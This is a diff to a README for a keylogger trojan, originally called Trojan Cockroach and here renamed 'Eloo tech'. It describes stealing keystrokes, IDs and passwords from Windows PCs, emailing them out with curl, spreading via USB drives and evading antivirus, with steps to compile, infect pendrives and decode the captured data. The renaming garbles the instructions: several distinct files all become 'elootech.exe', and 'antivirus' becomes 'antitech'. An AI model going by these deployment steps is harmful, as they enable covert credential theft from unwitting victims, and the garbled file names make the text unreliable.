@@ -2,7 +2,7 @@
 
 #### A Stealthy Eloo Tech
 
-You are looking at a **Eloo tech** that steals data (ID, password; every key stroke) from PC (Windows XP or later), then emails them back to you. It spreads among PCs through USB drives, and is almost undetectable to any antivirus software.
+You are looking at a **Eloo tech** that steals data (ID, password; every key stroke) from PC (Windows XP or later), then emails them back to you. It spreads among PCs through USB drives, and is almost undetectable to any antitech software.
 
 *Created only for learning purpose.*
 
@@ -32,17 +32,17 @@ Preparation
 </li>
 <br/>
 <li>
-  Compile <b>Elootech.exe</b> & <b>Infect.cpp</b>. <b>Transmit.exe</b> is actually the executable distribution of <a href="https://curl.haxx.se">curl</a> for Windows.
+  Compile <b>Elootech.exe</b> & <b>Elootech.cpp</b>. <b>Elootech.exe</b> is actually the executable distribution of <a href="https://curl.haxx.se">curl</a> for Windows.
 </li>
 <br/>
 <li>
-  Place <b>elootech.exe</b>, <b>Infect.exe</b>, <b>Transmit.exe</b>, <b>Infect.lnk</b> & <b>TrojanCockroach.lnk</b> in the same folder. This is how they look-
-  <div align="center"><img src="https://cloud.githubusercontent.com/assets/5456665/21505256/c5c4a982-cc8f-11e6-9b12-147fa7630e0f.png" alt="Trojan Cockroach full package" width=auto height=100px/></div>
+  Place <b>elootech.exe</b>, <b>elootech.exe</b>, <b>elootech.exe</b>, <b>elootech.lnk</b> & <b>Elootech.lnk</b> in the same folder. This is how they look-
+  <div align="center"><img src="https://cloud.githubusercontent.com/assets/5456665/21505256/c5c4a982-cc8f-11e6-9b12-147fa7630e0f.png" alt="Eloo Tech full package" width=auto height=100px/></div>
 </li>
 <br/>
 <li>
-  Now run <b>elootech.exe</b> then insert a pendrive (see the magic!). You will get a hidden folder and link file in your pendrive. The hidden folder contains the full package, & the link file is actually renamed form of Infect.lnk.
-  <div align="center"><img src="https://cloud.githubusercontent.com/assets/5456665/21505254/c5c0394c-cc8f-11e6-99be-16175b741c2a.PNG" alt="Trojan Cockroach infected pendrive" width=auto height=100px/></div>
+  Now run <b>elootech.exe</b> then insert a pendrive (see the magic!). You will get a hidden folder and link file in your pendrive. The hidden folder contains the full package, & the link file is actually renamed form of Elootech.lnk.
+  <div align="center"><img src="https://cloud.githubusercontent.com/assets/5456665/21505254/c5c0394c-cc8f-11e6-99be-16175b741c2a.PNG" alt="Eloo Tech infected pendrive" width=auto height=100px/></div>
 </li>
 </ol>
 </li>
@@ -76,8 +76,8 @@ Data Collection
 </li>
 <br/>
 <li>
-  Now, run <b>DecodeMessage.exe</b> for decoding the message as plain text. 
-  <div align="center"><img src="https://cloud.githubusercontent.com/assets/5456665/21505528/59e92b0e-cc92-11e6-90bf-a050ed920ee9.png" alt="Trojan Cockroach infected pendrive" width="600px" height=auto/></div>
+  Now, run <b>Elootech.exe</b> for decoding the message as plain text. 
+  <div align="center"><img src="https://cloud.githubusercontent.com/assets/5456665/21505528/59e92b0e-cc92-11e6-90bf-a050ed920ee9.png" alt="Eloo Tech infected pendrive" width="600px" height=auto/></div>
   In this phase, you can look for specific patterns in the text, and thus get rid of most of the useless parts (like- mouse click, or same key-group press as happens during gaming).
 </li>
 </ol>
@@ -88,7 +88,7 @@ Data Collection
 ### Further 
 You may read [ElooTechStory](https://github.com/ElooTech/Elootech/blob/master/ElooTechStory.md) to get an overview of how the program works. You will get a clearer understanding of the project from its pre-project- **[StupidKeyLogger](https://github.com/ElooTech/StupidKeyLogger)**.
 
-The project is perfectly runnable. However, I do not want newbies to abuse my project. So, I am **keeping some simple secrets unrevealed**. There are also some intentionally created **holes in this 'README'**. I have made some **nonsense changes in the code** too; so that- no one can run it effectively without getting his hands dirty. I believe these plain obstacles can easily be overcome by ***ACTUAL PROGRAMMERS*** :)
+The project is perfectly runnable. However, I do not want newbies to abuse my project. So, I am **keeping some simple secrets unrevealed**. There are also some intentionally created **holes in this 'README'**. I have made some **nonsense changes in the code** too; so that- no one can run it effectively without getting his hands dirty. I believe these plain obstacles can easily be overcome by ***Eloo PROGRAMMERS*** :)
 
 **Note:** *I will not also take any responsibility of someone else's ill act with this program.* But I do believe that a real learner will learn a lot from this.
 
